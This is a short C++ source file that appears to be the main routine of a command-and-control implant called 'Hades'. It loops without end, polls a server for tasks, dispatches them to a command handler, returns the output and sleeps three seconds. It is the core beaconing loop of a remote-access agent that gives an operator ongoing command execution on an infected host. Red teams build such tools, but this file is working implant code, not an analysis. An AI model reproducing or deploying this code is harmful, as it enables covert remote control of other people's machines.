#include "hades.h"
#include "../cmds/cmds.hpp"
#include <stdio.h>


BOOL RunHades() {
	hades = AllocMemory<Hades>(sizeof(Hades));
	

	if (!InitAgent()) {
		DEBUG_LOG("Failed Loading\n");
		return FALSE;
	}

	PBYTE buf = AllocMemory<BYTE>(BASE_BUFFER_SIZE);
	UINT capacity = BASE_BUFFER_SIZE;
	UINT finalSize = 0;
	while (TRUE) {
		g_ByteMgr->InitWrite();
		if (!g_Network->GetTask(&buf, BASE_BUFFER_SIZE, &finalSize, &capacity)) {
			DEBUG_LOG("Failed!");
			
		}
		DEBUG_LOG("Capacity = %d\nFinal Size = %d\n", capacity, finalSize);

		if(finalSize > 0) { 
			g_Commander->Dispatch(buf, finalSize, g_ByteMgr->OutData); 
			g_Network->SendOutput(g_ByteMgr->OutData, g_ByteMgr->WriteIndex);
			DEBUG_LOG("Write Index: %u\n", g_ByteMgr->WriteIndex);
		}
		

		Sleep(3000);
	}
}


Hades* hades = NULL;